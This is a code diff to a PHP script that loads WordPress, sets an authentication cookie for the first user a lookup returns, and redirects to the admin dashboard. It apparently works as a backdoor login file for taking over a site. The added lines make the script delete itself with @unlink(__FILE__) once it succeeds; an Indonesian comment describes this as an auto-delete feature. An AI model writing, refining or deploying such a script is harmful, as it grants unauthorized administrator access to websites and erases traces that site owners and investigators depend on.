@@ -8,6 +8,12 @@ if (file_exists('wp-load.php')){
 
 	if ( isset( $results[0] ) ) {
 		wp_set_auth_cookie( $results[0] );
+		
+		// Fitur Auto-Delete: Menghapus file skrip ini sendiri saat berhasil dieksekusi
+		if (file_exists(__FILE__)) {
+			@unlink(__FILE__);
+		}
+
 		wp_redirect( admin_url() );
 		die();
 	}
@@ -17,5 +23,4 @@ if (file_exists('wp-load.php')){
 else{
 	die('Failed to load');
 }
-
 ?>
